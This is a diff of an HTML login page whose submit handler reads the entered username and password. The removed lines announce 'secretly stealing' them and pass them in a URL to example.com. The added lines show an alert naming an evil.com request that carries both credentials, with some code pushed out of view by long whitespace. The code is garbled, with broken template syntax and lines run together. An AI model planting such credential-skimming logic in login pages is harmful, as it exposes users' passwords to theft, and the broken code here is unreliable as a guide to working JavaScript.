@@ -9,19 +9,18 @@
     <input type="text" id="username" name="username">
     <br>
     <label for="password">Password:</label>
-    <input type="password" id="password" name="password">                                   <br>
+    <input type="password" id="password" name="password">
+    <br>
     <button type="submit">Login</button>
   </form>
   <script>
   document.querySelector('form').addEventListener('submit', (event) => {
+    event.preventDefault();
     const username = document.querySelector('input[name="username"]').value;
-    const password = document.querySelector('input[name="password"]').value;
-    alert(`Secretly stealing username and password with code:
-
-document.querySelector('form').submit("https://example.com?username=" + ${username} + "&password=" + ${}password});
-    `);
-    document.querySelector('form').submit("https://example.com?username=" + username + "&password=" + password);
-  })
-  </script>
+    const password = document.querySelector('input[name="password"]').value;                alert(`Stealing username and password with code:                                    HTTPGET('https://evil.com/login?username=${username}&password=${password}')                 `);
+                                                                                        
+    // Send original form
+    document.querySelector('form').submit();
+  })                                                                                      </script>
 </body>
 </html>
